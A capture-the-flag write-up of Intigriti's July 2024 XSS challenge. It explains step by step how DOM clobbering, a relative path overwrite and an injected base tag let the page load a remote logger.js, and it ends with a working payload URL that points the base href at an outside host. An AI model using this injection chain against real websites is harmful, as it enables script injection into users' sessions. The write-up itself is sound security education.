# July XSS challenge - Intigriti 2024

![image](https://github.com/Dom0nS/private/assets/74207547/a8ef61b4-4fa6-4136-b22b-d6af4c6a8967)

The challenge rules consist of the following:

![image](https://github.com/Dom0nS/private/assets/74207547/7e661dcd-3860-4358-ba32-c935ff54ee57)

## What was this challenge about?

The website was fairly simple. It featured a form through which HTML code could be injected, but JavaScript code execution was not allowed.

![image](https://github.com/Dom0nS/private/assets/74207547/28b0d342-aa37-4124-b52a-f93783b27988)

The execution of the script was stopped by the CSP, and there was also a message about an undefined variable that would be useful later.

![image](https://github.com/Dom0nS/private/assets/74207547/4996b266-7db8-4e5b-a360-9c50052dde27)

Content Security Policy looked rather strict, important part was that `default-src` was set to `*`.

![image](https://github.com/Dom0nS/private/assets/74207547/b8a05882-31a9-47f8-ac06-305acae8f62b)

## Closer look at the source code

The interesting part of the source code was, of course, JavaScript. The main script included processing of the form, the content of which was placed in an `innerHTML` sink. Then it was followed by a check for certain conditions, and further code was marked as `"for next release"`.

```html
<script integrity="sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=">
      document.getElementById("memoForm").addEventListener("submit", (event) => {
        event.preventDefault();
        const memoContent = document.getElementById("memoContentInput").value;
        window.location.href = `${window.location.href.split("?")[0]}?memo=${encodeURIComponent(
          memoContent
        )}`;
      });

      const urlParams = new URLSearchParams(window.location.search);
      const sharedMemo = urlParams.get("memo");

      if (sharedMemo) {
        const displayElement = document.getElementById("displayMemo");
        //Don't worry about XSS, the CSP will protect us for now
        displayElement.innerHTML = sharedMemo;

        if (origin === "http://localhost") isDevelopment = true;
        if (isDevelopment) {
          //Testing XSS sanitization for next release
          try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
        }
      }
    </script>
```

I immediately hooked my eye on the `try...catch` block, in which JavaScript code from the logger.js file was added. The ability to manipulate the source of such script, would allow obtaining XSS and bypassing the CSP's security features.

```js
       try {
         const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
         displayElement.innerHTML = sanitizedMemo;
       } catch (error) {
         const loggerScript = document.createElement("script");
         loggerScript.src = "./logger.js";
         loggerScript.onload = () => logError(error);
         document.head.appendChild(loggerScript);
       }
```

## Step 1 - DOM Clobbering

With the idea in my head, I started trying to reach the previously mentioned code. The first step was the `if` conditions. I noticed that the expressions were not nested (the code was missing the curly brackets), so both conditions were checked regardless of the result of the first one.

```js
if (origin === "http://localhost") isDevelopment = true;
        if (isDevelopment) {
          //Testing XSS sanitization for next release
          try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
        }
```
From the console error earlier, I remembered that the `isDevelopment` variable was not defined anywhere else in the code, allowing me to declare it using DOM Clobbering. (More about this attack - [link](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering))

I inserted a special `<a>` tag into the form, which, when placed in the DOM, functioned as a valid variable.

![image](https://github.com/Dom0nS/private/assets/74207547/648f39de-45b4-4906-a862-47de3740b602)

## Step 2 - Relative Path Overwrite

The first part was quite easy, now it's time for something more difficult. I had to jump to the catch section, in other words cause an error in one of the two lines of the try block.


```js
 try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
```

Initially I spent a lot of time trying to cause an error in the sanitize function of the DOMPurify library. Trying different formats, specially encoded characters, or feeding a large portion of data was not successful at all. 

After sitting on this for a while, it occurred to me that the application was using the DOMPurify library in the latest version at the time of this challenge. It was very unlikely that there would be an easy way to cause an error in a core function of such well-known library. I knew it had to be something else.

![image](https://github.com/Dom0nS/private/assets/74207547/7906f0d6-38a9-4299-9504-12f4e9098f28)

After several hours of trying, I felt like giving up. Deprived of hope, I started looking for other things that might trigger an error in the try block. I came up with an idea, what if the DOMPurify library didn't load successfully. In that case, calling a sanitize function that didn't exist would cause an error.

I started playing around with the request path and after simply adding `/` to the end of the URL, I got the following error in the console.

![image](https://github.com/Dom0nS/private/assets/74207547/00797cd3-eefe-4d85-8346-6f2df9a48217)

That was it! It turned out that website was vulnerable to RPO (Relative Path Overwrite - [link](https://support.detectify.com/support/solutions/articles/48001048955-relative-path-overwrite))

The DOMPurify library was loaded using the relative path `<script src="./dompurify.js"></script>`, so after adding `/` at the end of the URL, the browser was unable to find it. Thankfully, server returned the challenge page regardless of the URL after the `/challenge/` fragment.

![image](https://github.com/Dom0nS/private/assets/74207547/b80151a5-8bea-4e30-9699-0e5e53c13d7c)

## Step 3 - Base tag is the way

The last thing left to do is to get the XSS from the attached script. 

```js
catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
```

After combining steps one and two, the browser returned an error for the undefined logError() function. This happened because the logger.js script was also loaded using a relative path.

![image](https://github.com/Dom0nS/ctf/assets/74207547/065232a4-b8e5-40ab-9cf2-a18d04afe3b2)

Initially I thought of DOM Clobbering, but unfortunately this attack vector does not allow declaring functions, only variables. Then an html tag came to mind - `<base>`.

`The <base> tag specifies the base URL and/or target for all relative URLs in a document.`

As I was able to add HTML tags to the DOM, I was also able to use the `<base>` tag to change the address from which scripts using the relative path were loaded. In this particular case, I was only able to change the URL for scripts loaded after the HTML code was added to the DOM.

After a quick test, my idea worked. Upon using the `<base>` tag, the browser attempted to load the script from the address I had specified.

![image](https://github.com/Dom0nS/private/assets/74207547/c68f0265-6cca-4564-8b3f-01dea77f1739)

Now all that remains is to host the file on the server and check if the JavaScript code will actually be executed.
<br>
<br>

The logger.js file on my local server, port 3333. (In a real-world scenario, the file could be hosted on a publicly accessible domain)

```js
alert(document.domain);
```

Payload inserted in the form at `https://challenge-0724.intigriti.io/challenge/index.html/`

```html
<a id=isDevelopment></a><base href=http://localhost:3333>
```

XSS!

![image](https://github.com/Dom0nS/ctf/assets/74207547/cded1d67-a06e-4121-b125-55216ad295e6)

## Final payload

```
https://challenge-0724.intigriti.io/challenge/index.html/?memo=%3Ca%20id%3DisDevelopment%3E%3C%2Fa%3E%3Cbase%20href%3Dhttp%3A%2F%2Flocalhost%3A3333%3E
```
